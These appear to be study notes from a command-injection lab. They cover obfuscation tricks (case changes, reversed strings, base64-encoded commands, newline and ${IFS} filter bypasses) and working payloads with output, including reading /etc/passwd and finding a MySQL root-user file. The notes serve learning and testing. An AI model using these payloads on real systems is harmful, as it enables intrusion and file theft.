# Advanced Command Obfuscation

## Case Manipulation

Powershell :
WhOaMi

Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative :
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

And then replace spaces by %09 :
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")

$(a="WhOaMi";printf %s "${a,,}")

## Reversed Commands

### Linux 

echo 'whoami' | rev
imaohw

Payload :
$(rev<<<'imaohw')


### Windows

"whoami"[-1..-20] -join ''
imaohw

OR

iex "$('imaohw'[-1..-20] -join '')"

echo -n whoami | iconv -f utf-8 -t utf-16le | base64
dwBoAG8AYQBtAGkA

## Encoded Commands

### Linux

echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

### Windows

[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
dwBoAG8AYQBtAGkA

iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
21y4d

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion

## LAB

127.0.0.1%0a



echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=

127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

127.0.0.1%0abash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
Invalid input

echo -n 'whoami' | base64
d2hvYW1p

127.0.0.1%0abash<<<$(base64%09-d<<<d2hvYW1p)

127.0.0.1%0abash<<<$(base64${IFS}-d<<<d2hvYW1p)

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.024/0.024/0.024/0.000 ms
www-data

127.0.0.1%0abash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

echo -n 'find /usr/share/' | base64
ZmluZCAvdXNyL3NoYXJlLw==

127.0.0.1%0abash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLw==)

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
/usr/share/
/usr/share/sensible-utils
/usr/share/sensible-utils/bin
/usr/share/sensible-utils/bin/gettext
/usr/share/gcc-10
/usr/share/gcc-10/python
/usr/share/gcc-10/python/libstdcxx
/usr/share/gcc-10/python/libstdcxx/v6
/usr/share/gcc-10/python/libstdcxx/v6/printers.py
/
...

127.0.0.1%0abash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
/usr/share/mysql/debian_create_root_user.sql